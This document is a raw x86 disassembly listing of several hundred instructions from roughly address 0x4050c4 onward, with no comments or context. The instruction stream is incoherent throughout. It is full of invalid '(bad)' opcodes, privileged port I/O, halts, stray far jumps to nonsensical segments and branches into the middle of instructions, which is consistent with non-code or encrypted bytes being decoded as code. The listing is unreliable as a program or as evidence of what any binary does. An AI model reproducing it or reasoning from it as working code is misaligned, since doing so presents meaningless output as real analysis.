  4050c4:	dec    ebp
  4050c5:	repz sbb DWORD PTR [eax-0x3fceeb39],ebx
  4050cc:	jo     0x40508f
  4050ce:	in     eax,dx
  4050cf:	mov    ah,0x37
  4050d1:	sbb    bh,BYTE PTR [eax+0x604892f1]
  4050d7:	rol    DWORD PTR [esi-0x48],1
  4050da:	jle    0x405123
  4050dc:	dec    edx
  4050dd:	test   al,0x24
  4050df:	pop    edx
  4050e0:	mov    edx,0xa7df71fd
  4050e5:	mov    eax,ds
  4050e7:	mov    ebx,0x544fb957
  4050ec:	sub    esi,eax
  4050ee:	retf   
  4050ef:	xchg   edx,eax
  4050f0:	test   eax,0x59482788
  4050f5:	adc    ch,al
  4050f7:	lods   al,BYTE PTR ds:[esi]
  4050f8:	xchg   dl,bh
  4050fa:	push   es
  4050fb:	fwait
  4050fc:	push   ss
  4050fd:	cmp    al,0x22
  4050ff:	std    
  405100:	ins    DWORD PTR es:[edi],dx
  405101:	adc    edi,DWORD PTR [ebp-0x1e]
  405104:	dec    ecx
  405105:	ror    DWORD PTR [ebx+eiz*4+0x15],cl
  405109:	add    ah,ah
  40510b:	adc    BYTE PTR [edx-0x11],dl
  40510e:	pop    ss
  40510f:	mov    al,0x3a
  405111:	icebp  
  405112:	push   es
  405113:	jo     0x40515e
  405115:	imul   DWORD PTR [ecx+eiz*8+0x233afbdf]
  40511c:	add    BYTE PTR [edi-0x22dd786b],dh
  405122:	shr    BYTE PTR [ebx+0x72],0xee
  405126:	ret    0xa32
  405129:	inc    edx
  40512a:	jle    0x4050ec
  40512c:	pop    edi
  40512d:	and    BYTE PTR [ecx-0x533e2897],al
  405133:	into   
  405134:	daa    
  405135:	imul   edx,DWORD PTR [ebp-0x5aa83ff2],0xffffffc8
  40513c:	lods   al,BYTE PTR ds:[esi]
  40513d:	xchg   ebp,eax
  40513e:	xor    BYTE PTR [edx],al
  405140:	push   ebp
  405141:	mul    BYTE PTR [ebx-0x62]
  405144:	stos   BYTE PTR es:[edi],al
  405145:	fidiv  DWORD PTR [ebx-0x290f8ef8]
  40514b:	retf   
  40514c:	imul   ebx,DWORD PTR [ebp-0x127e9aa2],0xffffff8b
  405153:	bound  ebx,QWORD PTR [esi]
  405155:	jmp    0xc6a9:0x5c847a90
  40515c:	inc    DWORD PTR [ebx+0x2de11f5e]
  405162:	bound  ecx,QWORD PTR [esi]
  405164:	(bad)  
  405165:	int3   
  405166:	jecxz  0x4051b4
  405168:	mov    dh,0x40
  40516a:	mov    WORD PTR [edi+0x79b8b0a8],?
  405170:	(bad)  
  405171:	scas   eax,DWORD PTR es:[edi]
  405172:	lock rol DWORD PTR [ebp-0x4e],0x74
  405177:	jle    0x4051c0
  405179:	mov    bh,0x73
  40517b:	fdivr  st,st(7)
  40517d:	stos   BYTE PTR es:[edi],al
  40517e:	xchg   esp,eax
  40517f:	clc    
  405180:	in     eax,dx
  405181:	sub    ebx,DWORD PTR [ebx]
  405183:	mov    bh,0x7d
  405185:	test   al,0x21
  405187:	retf   
  405188:	popf   
  405189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40518a:	out    0xbd,eax
  40518c:	aad    0xa0
  40518e:	cld    
  40518f:	(bad)  
  405190:	lock shl DWORD PTR [edx],0xe6
  405194:	int3   
  405195:	sbb    ecx,DWORD PTR [esi-0x4a88f474]
  40519b:	lds    esp,FWORD PTR [ecx-0x28fcef7]
  4051a1:	mov    eax,ds:0x216d66cf
  4051a6:	sbb    BYTE PTR [eax],bl
  4051a8:	push   ebp
  4051a9:	cli    
  4051aa:	stos   DWORD PTR es:[edi],eax
  4051ab:	lods   al,BYTE PTR ds:[esi]
  4051ac:	dec    esi
  4051ad:	mov    ds:0x814981f6,eax
  4051b2:	mov    edi,0xb8498593
  4051b7:	and    BYTE PTR [ebx+0x2a],0x1a
  4051bb:	iret   
  4051bc:	mov    dl,BYTE PTR [esi+ebp*4+0x5ec547d0]
  4051c3:	loop   0x4051da
  4051c5:	les    esp,FWORD PTR [ebx]
  4051c7:	cld    
  4051c8:	rcr    DWORD PTR [eax-0xe],cl
  4051cb:	shr    DWORD PTR ds:0xf6ae0e92,cl
  4051d1:	xchg   edi,eax
  4051d2:	push   esi
  4051d3:	sbb    ecx,edi
  4051d5:	or     esi,DWORD PTR [ecx+0x22]
  4051d8:	stos   BYTE PTR es:[edi],al
  4051d9:	pushf  
  4051da:	test   BYTE PTR [ebx],bh
  4051dc:	pop    esi
  4051dd:	lock aam 0xc
  4051e0:	sti    
  4051e1:	add    BYTE PTR [ebx+eax*2-0x78],cl
  4051e5:	mov    esi,0x9a8e625a
  4051ea:	out    0x98,eax
  4051ec:	test   eax,0x5b9c97c1
  4051f1:	cmp    BYTE PTR [edx+0x1b],ch
  4051f4:	and    DWORD PTR [esp+ecx*1-0x38],edx
  4051f8:	sbb    eax,0x74e1a29e
  4051fd:	btr    edi,ebx
  405200:	push   esp
  405201:	inc    edx
  405202:	dec    edi
  405203:	out    dx,eax
  405204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405205:	bound  ecx,QWORD PTR [esi]
  405207:	jo     0x405285
  405209:	fiadd  DWORD PTR gs:[eax+0x3c41ade7]
  405210:	pop    edi
  405211:	mov    ds:0xd8deec60,eax
  405216:	outs   dx,BYTE PTR ds:[esi]
  405217:	adc    DWORD PTR [ecx],ebp
  405219:	jge    0x405282
  40521b:	gs cs dec esp
  40521e:	dec    esi
  40521f:	mov    ebx,0xb47a7a74
  405224:	or     BYTE PTR [ebx],dh
  405226:	inc    ebp
  405227:	xlat   BYTE PTR ds:[ebx]
  405228:	jbe    0x405232
  40522a:	mov    cl,0x93
  40522c:	xchg   ebp,eax
  40522d:	and    BYTE PTR [esi],cl
  40522f:	test   eax,0x7dc1a1d3
  405234:	ins    BYTE PTR es:[edi],dx
  405235:	daa    
  405236:	shl    DWORD PTR [edi+0x10cc8212],0x41
  40523d:	xor    al,0x91
  40523f:	dec    ebp
  405240:	mov    eax,0x138b6403
  405245:	mov    eax,ebp
  405247:	cs cwde 
  405249:	xor    DWORD PTR [eax],ebp
  40524b:	dec    eax
  40524c:	push   edx
  40524d:	pop    esp
  40524e:	dec    edx
  40524f:	shl    BYTE PTR [eax+0x26],cl
  405252:	imul   edx,DWORD PTR [esp+eax*1],0x6531c959
  405259:	fcmove st,st(2)
  40525b:	xor    eax,DWORD PTR [eax+0x220766e9]
  405261:	mov    BYTE PTR ds:0x251d2875,dh
  405267:	jmp    0x458b4490
  40526c:	mov    bh,0x94
  40526e:	add    DWORD PTR [ebx],esi
  405270:	push   0xfffffff3
  405272:	pop    ebx
  405273:	push   ds
  405274:	mov    eax,ds:0xbb18ed02
  405279:	outs   dx,BYTE PTR ds:[esi]
  40527a:	jmp    0x405257
  40527c:	push   es
  40527d:	pop    ebp
  40527e:	dec    edi
  40527f:	sub    DWORD PTR ss:[edi-0x15],edi
  405283:	mov    DWORD PTR [ecx],ecx
  405285:	inc    edi
  405286:	(bad)
  40528a:	stos   DWORD PTR es:[edi],eax
  40528b:	adc    ch,BYTE PTR [edx]
  40528d:	sub    eax,DWORD PTR [ebx-0x2fa89494]
  405293:	add    BYTE PTR [ecx-0x28498011],bh
  405299:	daa    
  40529a:	cmp    ch,ch
  40529c:	jp     0x405284
  40529e:	push   eax
  40529f:	cmp    dh,BYTE PTR [ebx]
  4052a1:	shl    BYTE PTR [eax],cl
  4052a3:	cmp    al,0xff
  4052a5:	xor    DWORD PTR [edx-0x1],esi
  4052a8:	xchg   BYTE PTR [eax],bl
  4052aa:	or     edi,DWORD PTR [ecx+0x78]
  4052ad:	push   cs
  4052ae:	jg     0x40525b
  4052b0:	nop
  4052b1:	or     ah,ch
  4052b3:	out    dx,eax
  4052b4:	xor    bl,BYTE PTR [esi-0x6a]
  4052b7:	fisubr DWORD PTR [eax]
  4052b9:	mov    ebx,0xf0d66ad8
  4052be:	call   0x67b0:0x2f704e37
  4052c5:	retf   
  4052c6:	pop    es
  4052c7:	xchg   BYTE PTR [eax+eiz*4-0x1cfef13a],cl
  4052ce:	int    0x33
  4052d0:	loop   0x40525e
  4052d2:	push   0x3701744e
  4052d7:	mov    ch,0x28
  4052d9:	ins    DWORD PTR es:[edi],dx
  4052da:	scas   al,BYTE PTR es:[edi]
  4052db:	dec    edx
  4052dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052dd:	sbb    eax,0x2e076706
  4052e2:	retf   0xec25
  4052e5:	add    eax,DWORD PTR [ecx+0x526951f0]
  4052eb:	test   eax,0xb997a76a
  4052f0:	jecxz  0x4052bb
  4052f2:	out    dx,eax
  4052f3:	lds    ebx,FWORD PTR [edx]
  4052f5:	test   DWORD PTR [ebx+0x1e],edi
  4052f8:	cmp    BYTE PTR fs:[ecx+eax*1-0xe3f1bdb],0x45
  405301:	sub    DWORD PTR [ecx+0x50],0x4f7259cd
  405308:	pop    esi
  405309:	(bad)  
  40530a:	cmc    
  40530b:	cmp    ecx,DWORD PTR [esi+0x5715998]
  405311:	mov    gs,ebp
  405313:	mov    bh,0x3b
  405315:	xchg   esp,eax
  405316:	mov    cl,0x3e
  405318:	mov    DWORD PTR [edx+0x5fd40ec8],ebp
  40531e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40531f:	out    dx,eax
  405320:	or     DWORD PTR [edx],esp
  405322:	push   ebp
  405323:	push   cx
  405325:	xchg   DWORD PTR [ebp-0x1032810],ebx
  40532b:	fist   DWORD PTR [eax+0x4d7cd28b]
  405331:	ret    
  405332:	xchg   esi,eax
  405333:	jmp    0xa973:0xc97829be
  40533a:	xchg   DWORD PTR ds:0x4e6070c4,ebx
  405340:	dec    ebp
  405341:	and    eax,0x910e92f1
  405346:	in     eax,0x64
  405348:	add    eax,0xf4f2d62c
  40534d:	shr    BYTE PTR [ecx-0x34],1
  405350:	mov    ch,0x2b
  405352:	(bad)  
  405353:	mov    ds:0xd313fad7,eax
  405358:	leave  
  405359:	(bad)  
  40535a:	cmp    al,0x85
  40535c:	ja     0x4053bf
  40535e:	ret    0xcf1
  405361:	dec    esi
  405362:	jo     0x4052fb
  405364:	xchg   edi,eax
  405365:	mov    BYTE PTR [ebx+ecx*1-0x22],ah
  405369:	hlt    
  40536a:	or     BYTE PTR [eax+0x6030f6a5],cl
  405370:	pop    ds
  405371:	stos   BYTE PTR es:[edi],al
  405372:	or     DWORD PTR [ebx+0x12eae83c],ebp
  405378:	add    BYTE PTR [ebx-0x72],ch
  40537b:	in     al,0xfa
  40537d:	mov    edi,0xe96d9e8f
  405382:	sub    BYTE PTR [esp+ebx*4+0x6c],ch
  405386:	jb     0x405405
  405388:	clc    
  405389:	mov    dl,0x35
  40538b:	hlt    
  40538c:	xlat   BYTE PTR ds:[ebx]
  40538d:	or     al,0xd9
  40538f:	jb     0x405334
  405391:	inc    ebp
  405392:	cmp    eax,0xad892ca4
  405397:	call   ecx
  405399:	pushf  
  40539a:	fisubr DWORD PTR [ebx-0x47]
  40539d:	jle    0x40539f
  40539f:	jmp    0x40532b
  4053a1:	sub    bh,cl
  4053a3:	mov    ebx,0x2863e5e2
  4053a8:	mov    dh,bl
  4053aa:	loopne 0x40541d
  4053ac:	sub    ch,cl
  4053ae:	rcr    BYTE PTR ds:0x18610b8c,cl
  4053b4:	adc    eax,0xfde7cd06
  4053b9:	mov    dl,0x1c
  4053bb:	mov    dh,0x6d
  4053bd:	xor    BYTE PTR [ecx],bl
  4053bf:	fstp   QWORD PTR [eax+0x6cb22cf3]
  4053c5:	mov    bl,0x82
  4053c7:	ins    DWORD PTR es:[edi],dx
  4053c8:	(bad)  
  4053c9:	stc    
  4053ca:	dec    ebp
  4053cb:	out    0xdf,al
  4053cd:	(bad)  
  4053ce:	fnstenv [ebx]
  4053d0:	popa   
  4053d1:	imul   ebp,DWORD PTR [ebp+0x63],0xffffff9d
  4053d5:	or     DWORD PTR [esi],0xffffffb4
  4053d8:	or     BYTE PTR [ecx+eax*1],bh
  4053db:	lock outs dx,WORD PTR ds:[esi]
  4053de:	pusha  
  4053df:	push   edi
  4053e0:	adc    dh,BYTE PTR [ecx]
  4053e2:	mov    eax,0x79c200de
  4053e7:	ja     0x4053c9
  4053e9:	pop    ebp
  4053ea:	mov    WORD PTR [edi-0x69],es
  4053ed:	in     eax,0xcc
  4053ef:	ja     0x40537c
  4053f1:	(bad)  
  4053f2:	enter  0x6199,0xe0
  4053f6:	sbb    esi,edx
  4053f8:	xor    dl,BYTE PTR [ecx+0x61cc9344]
  4053fe:	sub    DWORD PTR [eax],ebp
  405400:	mov    ebp,0x3ddf189c
  405405:	lods   eax,DWORD PTR ds:[esi]
  405406:	lock add eax,0x2251369
  40540c:	jmp    0x4907d1cb
  405411:	shr    DWORD PTR [eax],cl
  405413:	cmp    al,0xd4
  405415:	loopne 0x4053ae
  405417:	cli    
  405418:	into   
  405419:	xchg   ecx,eax
  40541a:	cmc    
  40541b:	pop    ebx
  40541c:	daa    
  40541d:	mov    edx,0x5dca1fc7
  405422:	popa   
  405423:	cdq    
  405424:	sar    BYTE PTR [edx-0x75],0xf6
  405428:	and    DWORD PTR fs:[ecx],eax
  40542b:	adc    BYTE PTR [ebp-0x23],ch
  40542e:	nop
  40542f:	pop    es
  405430:	xchg   esi,eax
  405431:	dec    edx
  405432:	mov    ah,0x64
  405434:	cmp    cl,bh
  405436:	dec    eax
  405437:	xchg   esp,eax
  405438:	lea    esi,[eax+0x2fdd92c6]
  40543e:	cmp    eax,0xb80d4a50
  405443:	cld    
  405444:	or     bl,BYTE PTR [ebp+0x1ac22bc3]
  40544a:	mov    ecx,0x602d1b9
  40544f:	test   al,0x29
  405451:	and    BYTE PTR [ebx-0xeaa17c1],dl
  405457:	xor    al,0xc4
  405459:	pop    ebp
  40545a:	and    dh,bh
  40545c:	int    0xbd
  40545e:	or     al,BYTE PTR [edx-0x68]
  405461:	push   edx
  405462:	ret    
  405463:	cmp    cl,cl
  405465:	loope  0x40545a
  405467:	push   0x4b
  405469:	in     al,0x30
  40546b:	imul   esi,DWORD PTR [edx],0x15e64a56
  405471:	std    
  405472:	cmp    DWORD PTR ds:0xf74d23a3,0xffffffc2
  405479:	sar    BYTE PTR ss:[edi],1
  40547c:	sbb    BYTE PTR [ebx-0x209da8c0],bl
  405482:	ror    DWORD PTR [eax-0xd],0x23
  405486:	pop    es
  405487:	stos   BYTE PTR es:[edi],al
  405488:	jno    0x4054c5
  40548a:	(bad)  
  40548b:	sahf   
  40548c:	ja     0x405458
  40548e:	test   DWORD PTR [ecx],ebx
  405490:	pop    ecx
  405491:	inc    edx
  405492:	jmp    0x405427
  405494:	in     eax,0xea
  405496:	in     al,dx
  405497:	inc    edx
  405498:	iret   
  405499:	sub    eax,0xa614ac63
  40549e:	shl    DWORD PTR [eax],1
  4054a0:	test   BYTE PTR [edx],bh
  4054a2:	test   eax,0xdd207588
  4054a7:	das    
  4054a8:	test   al,0x75
  4054aa:	test   DWORD PTR [ebp-0x18],ecx
  4054ad:	or     esi,DWORD PTR [edx+0x8]
  4054b0:	pop    esp
  4054b1:	ds inc edx
  4054b3:	ins    BYTE PTR es:[edi],dx
  4054b4:	ss aad 0x69
  4054b7:	aad    0x92
  4054b9:	js     0x405445
  4054bb:	pop    edi
  4054bc:	push   edi
  4054bd:	jecxz  0x4054d9
  4054bf:	jb     0x4054c3
  4054c1:	mov    edx,0x639c7abd
  4054c6:	sub    eax,0x8e748cdc
  4054cb:	mov    dh,0x12
  4054cd:	loopne 0x4054ac
  4054cf:	mov    ah,0x60
  4054d1:	dec    eax
  4054d2:	push   0xcfcc9c01
  4054d7:	out    0xda,eax
  4054d9:	imul   ecx,DWORD PTR [eax],0xffffffbb
  4054dc:	stc    
  4054dd:	xchg   BYTE PTR [ecx],al
  4054df:	outs   dx,BYTE PTR ds:[esi]
  4054e0:	ja     0x4054eb
  4054e2:	imul   esp,DWORD PTR [edx-0x73b4fdff],0x91fe2a41
  4054ec:	push   eax
  4054ed:	(bad)  
  4054ee:	push   edx
  4054ef:	add    eax,0x5df3746f
  4054f4:	sar    DWORD PTR [edx+0x65],0x54
  4054f8:	(bad)  
  4054f9:	retf   0xd765
  4054fc:	popa   
  4054fd:	xchg   esi,eax
  4054fe:	jg     0x405486
  405500:	lods   eax,DWORD PTR ds:[esi]
  405501:	enter  0x8bab,0xb4
  405505:	data16 jo 0x4054e5
  405508:	push   ebx
  405509:	dec    eax
  40550a:	mov    ecx,0xf1247972
  40550f:	in     eax,dx
  405510:	sar    DWORD PTR [edx-0x8907b3d],1
  405516:	sub    DWORD PTR [esi],esp
  405518:	mov    ecx,0xe42b4a6c
  40551d:	dec    DWORD PTR [esi]
  40551f:	pop    edx
  405520:	shr    DWORD PTR [esi-0x6c84de7],1
  405526:	cli    
  405527:	adc    al,0x38
  405529:	int    0x41
  40552b:	gs leave 
  40552d:	jne    0x40551b
  40552f:	ror    BYTE PTR [edx],0xc3
  405532:	scas   eax,DWORD PTR es:[edi]
  405533:	les    esp,FWORD PTR [eax+edi*2+0x6d2087e0]
  40553a:	test   BYTE PTR [ecx-0x681fb208],dh
  405540:	jns    0x40559e
  405542:	cmp    cl,BYTE PTR [edi+ecx*8]
  405545:	sub    ch,0xa7
  405548:	cmp    eax,0x7c977862
  40554d:	jmp    0x5540:0x91297faa
  405554:	mov    ecx,DWORD PTR [esi]
  405556:	dec    edx
  405557:	loopne 0x4055ae
  405559:	outs   dx,DWORD PTR ds:[esi]
  40555a:	test   BYTE PTR [edi-0xe],0xfa
  40555e:	mov    WORD PTR [ebx-0x22f895d4],ds
  405564:	xor    bl,BYTE PTR [ebp-0x7c36cd2b]
  40556a:	rcr    DWORD PTR [edx+ebx*4+0x6bdbc34f],1
  405571:	push   esp
  405572:	push   ss
  405573:	and    eax,0x2a2dd8f8
  405578:	fidivr DWORD PTR [eax+esi*1]
  40557b:	scas   eax,DWORD PTR es:[edi]
  40557c:	inc    edx
  40557d:	adc    ch,BYTE PTR ds:0xf32b48ca
  405583:	(bad)  
  405584:	aas    
  405585:	push   edx
  405586:	mov    ch,0x50
  405588:	mov    BYTE PTR [ebp+0x1a562497],ch
  40558e:	inc    ebx
  40558f:	je     0x4055ff
  405591:	jmp    0x4055f8
  405593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405595:	mov    ch,0x50
  405597:	and    DWORD PTR gs:[edx],ebp
  40559a:	pop    esp
  40559b:	mov    ds:0x6f91d99a,al
  4055a0:	xor    bl,BYTE PTR [ebp-0x78]
  4055a3:	rcr    eax,0xd7
  4055a6:	scas   al,BYTE PTR es:[edi]
  4055a7:	push   ecx
  4055a8:	dec    ecx
  4055a9:	outs   dx,DWORD PTR ds:[esi]
  4055aa:	lea    edi,[ebp+eiz*8-0x44]
  4055ae:	xchg   esp,eax
  4055af:	das    
  4055b0:	sbb    al,0x1c
  4055b2:	test   DWORD PTR [esi-0x4476d705],esi
  4055b8:	int3   
  4055b9:	das    
  4055ba:	fwait
  4055bb:	or     esp,DWORD PTR [ecx]
  4055bd:	jae    0x4055bb
  4055bf:	cmp    bh,ah
  4055c1:	sub    al,0xca
  4055c3:	xchg   esp,eax
  4055c4:	std    
  4055c5:	adc    ch,BYTE PTR [esi-0x2b]
  4055c8:	popf   
  4055c9:	in     al,dx
  4055ca:	xor    al,0xc7
  4055cc:	inc    esi
  4055cd:	sub    BYTE PTR [ebp-0x594c02f3],bl
  4055d3:	adc    BYTE PTR [edi],al
  4055d5:	mov    dh,0x6
  4055d7:	ins    BYTE PTR es:[edi],dx
  4055d8:	enter  0x89e,0x2a
  4055dc:	xchg   DWORD PTR [edx-0x644fa559],ecx
  4055e2:	loop   0x4055ae
  4055e4:	dec    eax
  4055e5:	mov    dh,0xbb
  4055e7:	pop    edx
  4055e8:	ss loop 0x405590
  4055eb:	cmc    
  4055ec:	in     eax,0x6c
  4055ee:	push   esi
  4055ef:	call   0x9f652950
  4055f4:	pop    ss
  4055f5:	dec    ecx
  4055f6:	jle    0x40566c
  4055f8:	sbb    ch,BYTE PTR [esi-0x374102f9]
  4055fe:	push   eax
  4055ff:	lock sub al,0xd3
  405602:	cmp    ah,BYTE PTR [eax]
  405604:	in     eax,dx
  405605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405606:	pop    esi
  405607:	and    eax,0xf109f08b
  40560c:	(bad)  
  40560d:	(bad)  
  40560e:	lock jbe 0x4055af
  405611:	lods   al,BYTE PTR ds:[esi]
  405612:	int    0xae
  405614:	mov    bl,0x83
  405616:	inc    edi
  405617:	xor    BYTE PTR [eax],ch
  405619:	push   edi
  40561a:	mov    DWORD PTR [ecx-0x3d],eax
  40561d:	lods   eax,DWORD PTR ds:[esi]
  40561e:	and    BYTE PTR ds:0xa9d09736,bh
  405624:	push   0xffffff9e
  405626:	pop    esi
  405627:	adc    BYTE PTR es:[ecx-0x60],cl
  40562b:	lods   eax,DWORD PTR ds:[esi]
  40562c:	test   eax,0x601e6d59
  405631:	xor    DWORD PTR [esi+0x6f],0xe9ac80fa
  405638:	sbb    eax,0xeb10189f
  40563d:	pop    edx
  40563e:	sbb    eax,DWORD PTR [eax-0xa292261]
  405644:	pop    esp
  405645:	mov    bl,0xd2
  405647:	fld    TBYTE PTR [edx]
  405649:	add    BYTE PTR [ecx-0x60],0x39
  40564d:	mov    fs:0x65e254ca,eax
  405653:	lods   eax,DWORD PTR ds:[esi]
  405654:	test   ecx,esi
  405656:	div    DWORD PTR [ecx+ecx*1+0x63]
  40565a:	pop    ecx
  40565b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40565c:	(bad)  
  40565d:	and    al,BYTE PTR [ebx+0x55]
  405660:	int3   
  405661:	popa   
  405662:	(bad)  
  405664:	aam    0x57
  405666:	or     al,0x8b
  405668:	xchg   edx,eax
  405669:	out    dx,eax
  40566a:	inc    edi
  40566b:	mov    ah,0xc1
  40566d:	or     BYTE PTR [esi],bh
  40566f:	adc    DWORD PTR [esi+esi*4],esp
  405672:	xor    eax,0x45350b9d
  405677:	mov    BYTE PTR ds:0x63b755e5,dh
  40567d:	ficom  WORD PTR [edx+ecx*2+0x5a]
  405681:	cdq    
  405682:	test   ah,dl
  405684:	out    0xb,al
  405686:	fdivp  st(2),st
  405688:	or     esi,ebx
  40568a:	aas    
  40568b:	sub    eax,0x74d122f
  405691:	push   ecx
  405692:	or     bh,BYTE PTR [ecx]
  405694:	xor    eax,0x3c96c103
  405699:	rcl    DWORD PTR [ecx-0x15],cl
  40569c:	ficom  WORD PTR [edx]
  40569e:	jbe    0x4056c2
  4056a0:	push   ss
  4056a1:	adc    DWORD PTR ds:0x1ff73438,eax
  4056a7:	inc    eax
  4056a8:	xor    ebp,esp
  4056aa:	in     eax,dx
  4056ab:	xchg   edi,eax
  4056ac:	adc    esp,DWORD PTR [edx]
  4056ae:	das    
  4056af:	imul   BYTE PTR [eax+0x61]
  4056b2:	mov    edi,0x609189f5
  4056b7:	es cwde 
  4056b9:	stos   DWORD PTR es:[edi],eax
  4056ba:	imul   esi,DWORD PTR [ecx+0x23],0x6f
  4056be:	or     dh,cl
  4056c0:	mov    edx,0xf159d4b3
  4056c5:	jns    0x405702
  4056c7:	push   edi
  4056c8:	aas    
  4056c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ca:	cdq    
  4056cb:	xchg   edx,eax
  4056cc:	pop    ds
  4056cd:	into   
  4056ce:	ret    0xfeaf
  4056d1:	mov    bl,0xdc
  4056d3:	mov    BYTE PTR [ecx-0x35],bh
  4056d6:	jge    0x4056f8
  4056d8:	xchg   esi,eax
  4056d9:	rol    eax,cl
  4056db:	pop    es
  4056dc:	aam    0x9d
  4056de:	dec    ebp
  4056df:	into   
  4056e0:	jmp    0x40570b
  4056e2:	mov    eax,0x72413f6f
  4056e7:	popa   
  4056e8:	nop
  4056e9:	inc    ecx
  4056ea:	fadd   DWORD PTR [edi]
  4056ec:	lahf   
  4056ed:	(bad)  
  4056ee:	loopne 0x4056f8
  4056f0:	and    BYTE PTR [eax],ch
  4056f2:	stos   DWORD PTR es:[edi],eax
  4056f3:	sbb    al,ah
  4056f5:	cli    
  4056f6:	aaa    
  4056f7:	add    BYTE PTR [edx-0x7f],0x26
  4056fb:	mov    DWORD PTR [ebp+0x7ab348e8],esi
  405701:	nop
  405702:	add    BYTE PTR [esp+eax*4-0x69e52e6f],dl
  405709:	push   0x71
  40570b:	das    
  40570c:	stos   DWORD PTR es:[edi],eax
  40570d:	fcmovnu st,st(6)
  40570f:	sahf   
  405710:	jns    0x405763
  405712:	adc    BYTE PTR [esi],0x99
  405715:	aaa    
  405716:	lods   eax,DWORD PTR ds:[esi]
  405717:	or     eax,0x878bebf
  40571c:	std    
  40571d:	push   esi
  40571e:	shl    DWORD PTR [edi+0x47],1
  405721:	icebp  
  405722:	jl     0x405707
  405724:	sar    DWORD PTR [ebx+0x5b],cl
  405727:	das    
  405728:	aaa    
  405729:	div    ebp
  40572b:	jp     0x405714
  40572d:	pop    es
  40572e:	lock lea eax,[edx+ebx*1+0xf759841]
  405736:	iret   
  405737:	jno    0x40572e
  405739:	repnz add eax,0x83ebb690
  40573f:	pop    edx
  405740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405741:	icebp  
  405742:	aaa    
  405743:	popa   
  405744:	cmp    DWORD PTR [edx],eax
  405746:	fs or  al,0x5a
  405749:	not    ebp
  40574b:	push   ss
  40574c:	stc    
  40574d:	mov    edx,0xacc6a460
  405752:	sub    ebp,ebx
  405754:	cld    
  405755:	pop    DWORD PTR [ecx]
  405757:	xchg   ebx,eax
  405758:	pushf  
  405759:	out    0x6c,eax
  40575b:	dec    esi
  40575c:	ficom  DWORD PTR [esi-0x78]
  40575f:	pop    ebx
  405760:	xlat   BYTE PTR ds:[ebx]
  405761:	cs jno 0x4056f2
  405764:	leave  
  405765:	ins    BYTE PTR es:[edi],dx
  405766:	scas   al,BYTE PTR es:[edi]
  405767:	add    BYTE PTR [ebx],al
  405769:	and    BYTE PTR [esi-0x15a821ad],bh
  40576f:	test   DWORD PTR [eax+esi*4+0x7f],esp
  405773:	pop    edx
  405774:	jnp    0x4057a5
  405776:	mov    edi,0x516483b9
  40577b:	ds adc esp,ebp
  40577e:	int3   
  40577f:	into   
  405780:	cwde   
  405781:	scas   eax,DWORD PTR es:[edi]
  405782:	and    esi,DWORD PTR [ebx-0x2daa99a0]
  405788:	enter  0x47,0xa6
  40578c:	mov    ah,0x2b
  40578e:	stc    
  40578f:	mov    ds:0xa4d16c49,eax
  405794:	cmp    al,0x26
  405796:	add    eax,0x7f172d18
  40579b:	stos   BYTE PTR es:[edi],al
  40579c:	lea    eax,[ebx+0x66]
  40579f:	ins    DWORD PTR es:[edi],dx
  4057a0:	inc    esp
  4057a1:	imul   edi,DWORD PTR [edi+0x6fc833a5],0xffffffd3
  4057a8:	out    0x41,al
  4057aa:	scas   eax,DWORD PTR es:[edi]
  4057ab:	int3   
  4057ac:	push   cs
  4057ad:	repnz mov DWORD PTR [edi-0x36],esi
  4057b1:	arpl   WORD PTR [eax+0x4b],dx
  4057b4:	xor    DWORD PTR [ebp-0x49952867],edx
  4057ba:	jns    0x4057bf
  4057bc:	into   
  4057bd:	int3   
  4057be:	fidivr DWORD PTR [esi-0x51630834]
  4057c4:	cwde   
  4057c5:	leave  
  4057c6:	addr16 push ss
  4057c8:	mov    ecx,0xb4fba565
  4057cd:	dec    edi
  4057ce:	cs jecxz 0x40575f
  4057d1:	into   
  4057d2:	mov    edx,0x9560162b
  4057d7:	add    DWORD PTR [edx],ebx
  4057d9:	daa    
  4057da:	adc    BYTE PTR [eax],bh
  4057dc:	call   DWORD PTR [ebp-0x26df28c2]
  4057e2:	mov    ch,cl
  4057e4:	adc    al,0x0
  4057e6:	loop   0x405845
  4057e8:	adc    ebp,DWORD PTR [ebp+ecx*8+0x68415454]
  4057ef:	(bad)  
  4057f0:	fistp  QWORD PTR [ecx-0x55]
  4057f3:	sbb    BYTE PTR [esi-0xb12666b],al
  4057f9:	mov    al,BYTE PTR [edi+0x79186693]
  4057ff:	add    DWORD PTR [ebp-0x4ec59159],eax
  405805:	fidivr WORD PTR ds:0x4cbb0c76
  40580b:	aaa    
  40580c:	pusha  
  40580d:	in     eax,dx
  40580e:	outs   dx,DWORD PTR ds:[esi]
  40580f:	jle    0x4057fd
  405811:	mov    BYTE PTR [esp+ebp*2-0x470909ea],dl
  405818:	mov    ebp,0xeb43a695
  40581d:	or     BYTE PTR [ebx-0x47],al
  405820:	dec    edi
  405821:	jp     0x405808
  405823:	arpl   WORD PTR [edi+0x1ffac431],bx
  405829:	repnz add eax,0x5a6c66c0
  40582f:	and    BYTE PTR [edi-0x2d],0x7a
  405833:	out    0xe3,eax
  405835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405836:	in     al,0x87
  405838:	adc    bl,ch
  40583a:	lds    ebp,FWORD PTR [ebx+0x33]
  40583d:	mov    ebp,esi
  40583f:	add    ebp,DWORD PTR [edx]
  405841:	jge    0x4057ea
  405843:	movlps xmm0,QWORD PTR [eax-0x3d]
  405847:	fadd   DWORD PTR [edi+0x1e24b10c]
  40584d:	pop    ebx
  40584e:	dec    esp
  40584f:	dec    edi
  405850:	pushf  
  405851:	aaa    
  405852:	in     al,dx
  405853:	cmp    al,0xd4
  405855:	add    ah,BYTE PTR [edx+0x3623414d]
  40585b:	neg    ebp
  40585d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40585e:	dec    edx
  40585f:	pop    esp
  405860:	push   0xffffffbc
  405862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
